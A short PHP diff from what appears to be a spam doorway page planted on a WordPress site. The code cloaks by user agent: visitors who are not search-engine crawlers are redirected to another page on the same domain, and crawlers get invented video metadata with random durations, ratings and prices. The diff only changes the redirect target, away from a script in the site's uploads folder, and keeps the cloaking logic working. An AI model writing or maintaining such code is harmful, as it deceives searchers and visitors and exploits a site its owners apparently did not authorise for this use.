@@ -4,7 +4,7 @@
 if (isset($_SERVER['HTTP_USER_AGENT'])) {
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
     if (!preg_match('/google|bing|yandex|bot|spider|crawler/i', $user_agent)) {
-        header('Location: https://www.sookeregionchamber.com/wp-content/uploads/2021/03/blck/index.php?search=jav');
+        header('Location: https://www.sookeregionchamber.com/gotopage/');
         exit;
     }
 }
@@ -19,7 +19,7 @@ $duration = 'PT' . mt_rand(2, 25) . 'M' . mt_rand(10, 59) . 'S';
 $thumbnail_url = 'https://placehold.co/1280x720/111827/FFFFFF?text=' . urlencode($page_title_human_readable);
 $video_content_url = $canonical . 'video.mp4';
 $embed_url = str_replace('/detailsid/', '/embed/', $canonical);
-$final_redirect_url = 'https://www.sookeregionchamber.com/wp-content/uploads/2021/03/blck/index.php';
+$final_redirect_url = 'https://www.sookeregionchamber.com/gotopage/';
 $random_rating_value = number_format(mt_rand(45, 50) / 10.0, 1);
 $random_price = number_format(mt_rand(10, 100) / 100.0, 2);
 
